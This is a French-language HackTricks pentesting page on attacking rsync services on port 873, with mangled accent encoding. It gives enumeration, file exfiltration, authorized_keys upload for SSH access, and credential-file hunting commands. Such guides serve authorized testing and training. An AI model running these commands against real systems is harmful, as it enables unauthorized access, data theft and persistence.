# 873 - Pentesting Rsync

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Informations de base**

D'apr√®s [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** est un utilitaire pour [transf√©rer](https://en.wikipedia.org/wiki/File\_transfer) et [synchroniser](https://en.wikipedia.org/wiki/File\_synchronization) efficacement des [fichiers](https://en.wikipedia.org/wiki/Computer\_file) entre un ordinateur et un disque dur externe et entre des [ordinateurs](https://en.wikipedia.org/wiki/Computer) en r√©seau en comparant les [horodatages de modification](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) et les tailles des fichiers.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) On le trouve couramment sur les [syst√®mes d'exploitation](https://en.wikipedia.org/wiki/Operating\_system) de type [Unix-like](https://en.wikipedia.org/wiki/Unix-like). L'algorithme rsync est un type de [codage delta](https://en.wikipedia.org/wiki/Delta\_encoding) et est utilis√© pour minimiser l'utilisation du r√©seau. [Zlib](https://en.wikipedia.org/wiki/Zlib) peut √™tre utilis√© pour une [compression de donn√©es](https://en.wikipedia.org/wiki/Data\_compression) suppl√©mentaire,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) et [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) ou [stunnel](https://en.wikipedia.org/wiki/Stunnel) peuvent √™tre utilis√©s pour la s√©curit√©.

**Port par d√©faut:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## √ânum√©ration

### Banni√®re & Communication manuelle
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **√ânum√©ration des dossiers partag√©s**

Les **modules Rsync** sont reconnus comme des **partages de r√©pertoires** qui pourraient √™tre **prot√©g√©s par des mots de passe**. Pour identifier les modules disponibles et v√©rifier s'ils n√©cessitent des mots de passe, les commandes suivantes sont utilis√©es :
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Soyez conscient que certaines partages pourraient ne pas appara√Ætre dans la liste, les cachant √©ventuellement. De plus, l'acc√®s √† certains partages pourrait √™tre restreint √† des **identifiants** sp√©cifiques, comme indiqu√© par un message **"Acc√®s refus√©"**.

### [**Brute Force**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Utilisation Manuelle de Rsync

Apr√®s avoir obtenu une liste de **modules**, les actions d√©pendent de la n√©cessit√© d'authentification. Sans authentification, **lister** et **copier** des fichiers depuis un dossier partag√© vers un r√©pertoire local est r√©alis√© en utilisant :
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Ce processus **transf√®re de mani√®re r√©cursive des fichiers**, en pr√©servant leurs attributs et permissions.

Avec des **identifiants**, la liste et le t√©l√©chargement depuis un dossier partag√© peuvent √™tre effectu√©s comme suit, o√π une invite de mot de passe appara√Ætra :
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Pour **t√©l√©charger du contenu**, tel qu'un fichier _**authorized_keys**_ pour l'acc√®s, utilisez :
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Pour localiser le fichier de configuration rsyncd, ex√©cutez :
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Dans ce fichier, un param√®tre _secrets file_ pourrait pointer vers un fichier contenant **des noms d'utilisateur et des mots de passe** pour l'authentification rsyncd.


## R√©f√©rences
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
